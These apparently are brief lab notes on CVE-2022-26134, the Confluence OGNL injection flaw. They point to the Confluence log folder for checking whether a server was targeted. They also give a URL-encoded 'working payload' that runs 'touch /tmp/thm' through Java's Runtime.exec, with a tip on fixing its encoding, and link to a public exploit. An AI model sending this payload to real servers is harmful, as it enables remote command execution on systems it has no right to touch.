# CVE-2022-26134 (Writeup/understanding)

The logs are located in /opt/atlassian/confluence/logs
You can see if you've been targeted by searching for payloads in the logs folder.


URLencode output:
%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20%2Ftmp%2Fthm%2F%22%29%7D%/


For some reason urlencode appends a % between } and /. The % needs to be removed. This can be viewed by using cyberchef

Working payload:
%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/thm%22%29%7D/c


[Exploit](https://github.com/Nwqda/CVE-2022-26134)
[Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2022/06/29/atlassian-confluence-ognl-injection-remote-code-execution-rce-vulnerability-cve-2022-26134)
[OWASP Expression Language Injection](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
